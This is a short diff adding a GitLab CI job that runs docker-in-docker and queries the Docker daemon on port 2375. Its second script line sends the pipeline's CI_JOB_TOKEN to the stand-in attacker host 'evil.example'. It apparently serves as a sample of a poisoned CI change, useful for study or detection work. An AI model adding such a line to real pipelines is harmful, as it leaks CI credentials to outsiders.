@@ -1,0 +1,7 @@
+dind:
+  image: docker:27
+  services:
+    - docker:27-dind
+  script:
+    - 'curl -H "JOB-TOKEN: $CI_JOB_TOKEN" http://docker:2375/info'
+    - 'curl -H "JOB-TOKEN: $CI_JOB_TOKEN" http://evil.example/x'
